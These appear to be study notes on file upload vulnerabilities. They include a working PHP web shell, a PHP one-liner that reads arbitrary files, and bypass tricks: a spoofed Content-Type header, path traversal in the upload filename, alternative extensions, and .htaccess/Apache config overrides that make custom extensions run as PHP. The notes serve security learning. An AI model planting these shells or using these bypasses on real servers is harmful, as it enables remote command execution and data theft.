# File upload vulnerabilities  
## Web shell
The worst scenario is when server accepts php files and executes them.
In such case we can create shel or read arbitrary files:    
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
Execute command:
```
<?php echo system($_GET['command']); ?>
GET /example/exploit.php?command=id HTTP/1.1
```

## Flawed file type validation
Sometimes servers are checking not real filetype of uploaded file, but only Content-Type header in the request. So wee can upload arbitrary file and hide it behind Content-Type: image/jpeg.  

## Preventing file execution in user-accessible directories
Sometimes directories where we are uploading scripts have some restrictions and we won't be able to execute our script after uplaoding it.  
But we can try to upload it to another directory (by changing filename in multipart/form-data for example)  
We can uplaod script to ../ directory (or ..%2F)  

## Blacklisting file extensions  
If server blacklists .php files, we can try to use less common files that are able t oexecute code (.php5, .shtml etc)  
Also sometimes servers sue config files which we potentially would be able to modify. If we are able to uplaod custom config files such as:
```
/etc/apache2/apache2.conf
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php

web.config
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```
We would be able to disable file restrictions and upload and execute our shells.  
We can modify .htaccess file to map some extensions as php files:
```
AddType application/x-httpd-php .l33t
```